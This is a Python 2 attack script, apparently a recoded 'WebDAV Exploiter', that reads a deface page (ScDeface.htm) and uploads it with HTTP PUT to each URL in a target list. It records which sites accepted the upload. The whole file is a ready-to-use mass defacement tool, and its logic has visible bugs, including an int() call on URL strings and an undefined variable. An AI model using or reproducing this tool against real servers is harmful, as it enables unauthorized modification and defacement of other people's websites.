#!/usr/bin/python
###########################################
# ./Xazovyk  | wwx@dr.com.                #
###########################################


import requests
import string
import sys
import os

from urllib2 import Request, urlopen, URLError, HTTPError
os.system("clear")

print """
 _       __     __    ____
| |     / /__  / /_  / __ \____ __   __
| | /| / / _ \/ __ \/ / / / __ `/ | / /
| |/ |/ /  __/ /_/ / /_/ / /_/ /| |/ /
|__/|__/\___/_.___/_____/\__,_/ |___/Xazovyk®"""
if len(sys.argv) != 2:
    print '\nUsage : '+sys.argv[0]+' ScDeface.htm\n'
    sys.exit(0)
with open(sys.argv[1], 'rb') as f:
      s = f.read()
      setan = s
print("""

[*] WebDAV Exploiter File Upload
[*] Recoded Dari WebDAV.php
[*] By Xazovyk
""")
ss = raw_input("Masukan Target List:")
t = open(ss ,'r')
bes = raw_input("Masukan Save Files:")
becas = sys.argv[1]
def scan():
    while True:
        print( 30 * '=')
        su = t.readline()
        su = su.replace("\n","")
        if su[:7] != "http://":
         su = "http://"+su
        else:
         su = int(su)
        output = "/"+becas
        sa = su + output
        print '\n[*] Uploading File Ke Target'
        print '[*] Kirim %d byte, Ke Target...' % len(becas)
        print 'Upload to ' + sa
        r = requests.put(str(sa), data=setan, headers={'Content-Type':'application/octet-stream'})
        s = r.status_code
        print(r)
        print("Statu code: "+ str(s) )
        if r.status_code < 200 or r.status_code >= 300:
            print '[!] Upload Gagal... '
        else:
            print('[*] File Sukses Terupload...')
            sundel = sa + "\n"
            print('[*] Path : '+sa)
            c = open(bes, 'a')
            c.write(sa + "\n")
            c.close()
        print ""
scan()
print('File Saved On: '+bas+'/'+bes)